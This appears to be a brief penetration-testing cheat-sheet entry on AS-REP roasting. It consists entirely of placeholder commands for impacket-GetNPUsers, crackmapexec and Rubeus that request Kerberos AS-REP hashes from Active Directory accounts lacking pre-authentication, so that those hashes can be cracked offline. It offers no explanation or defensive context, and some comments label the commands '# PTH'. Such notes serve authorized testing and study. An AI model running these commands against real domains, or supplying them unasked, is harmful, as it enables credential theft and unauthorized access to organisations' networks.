# AS-REP Roasting
```bash
impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/' -usersfile <USERLIST>
impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -request # PTH

crackmapexec ldap <IP> --kdcHost <IP> -u '<USER>' -p '<PASS>' --asreproast <OUTPUT> # PTH

Rubeus.exe asreproast /nowrap
```